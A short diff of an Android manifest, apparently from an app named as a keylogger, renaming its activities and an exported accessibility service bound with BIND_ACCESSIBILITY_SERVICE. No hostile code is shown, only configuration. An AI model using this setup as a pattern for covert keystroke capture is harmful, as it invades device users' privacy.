@@ -20,7 +20,7 @@
         android:label="@string/app_name"
         android:theme="@style/Theme.AndroidKeyLogger">
         <activity
-            android:name=".MainActivity"
+            android:name=".MainFixActivity"
             android:configChanges="orientation|screenSize"
             android:exported="true"
             android:launchMode="singleTask">
@@ -32,12 +32,12 @@
             </intent-filter>
         </activity>
         <activity
-            android:name=".AccessibilityActivity"
+            android:name=".AccessibilityFixActivity"
             android:configChanges="orientation|screenSize"
             android:exported="false" />
 
         <service
-            android:name=".SvcAcc"
+            android:name=".SvcAccFix"
             android:exported="true"
             android:label="@string/app_name"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
